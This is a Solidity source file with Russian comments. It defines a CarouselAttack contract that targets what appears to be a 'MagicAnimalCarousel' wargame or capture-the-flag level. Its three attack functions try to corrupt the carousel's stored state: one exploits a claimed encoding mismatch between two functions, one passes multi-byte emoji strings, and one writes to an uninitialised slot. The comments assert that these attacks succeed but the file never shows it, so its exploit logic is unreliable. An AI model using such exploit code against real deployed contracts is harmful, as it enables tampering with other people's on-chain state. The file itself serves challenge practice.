// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;

    function changeAnimal(string calldata animal, uint256 crateId) external;

    function carousel(uint256 crateId) external view returns (uint256);

    function currentCrateId() external view returns (uint256);

    function encodeAnimalName(
        string calldata animalName
    ) external pure returns (uint256);
}

contract CarouselAttack {
    IMagicAnimalCarousel public carousel;

    constructor(address _carouselAddress) {
        carousel = IMagicAnimalCarousel(_carouselAddress);
    }

    function attack() external {
        // Шаг 1: Добавляем животное через setAnimalAndSpin
        carousel.setAnimalAndSpin("Wolf");

        // Получаем текущий ID ячейки, куда было помещено наше животное
        uint256 crateId = carousel.currentCrateId();

        // Шаг 2: Изменяем животное через changeAnimal, используя несогласованность в кодировании
        // Функция changeAnimal использует другую логику кодирования, чем setAnimalAndSpin
        carousel.changeAnimal("Tiger", crateId);

        // После этого кодировка животного будет отличаться от ожидаемой,
        // нарушая "магическое правило карусели"
    }

    // Альтернативная атака с использованием UTF-8 символов
    function attackWithUTF8() external {
        // Шаг 1: Добавляем животное
        carousel.setAnimalAndSpin("Cat");

        // Получаем текущий ID ячейки
        uint256 crateId = carousel.currentCrateId();

        // Шаг 2: Используем строку с эмодзи, которые занимают больше байтов, чем кажется
        // Это эксплуатирует неправильную обработку UTF-8 символов
        string memory specialAnimal = unicode"🦄🐉🦊"; // Каждый эмодзи занимает 4 байта
        carousel.changeAnimal(specialAnimal, crateId);
    }

    // Атака на пустой слот
    function attackEmptySlot() external {
        // Выбираем произвольный слот, который не был инициализирован
        uint256 emptySlotId = 999;

        // Напрямую изменяем животное в пустом слоте
        carousel.changeAnimal("Snake", emptySlotId);

        // Теперь слот принадлежит атакующему, хотя он не был правильно добавлен в карусель
    }

    // Функция для проверки успешности атаки
    function verifyAttack(uint256 crateId) external view returns (uint256) {
        return carousel.carousel(crateId);
    }
}
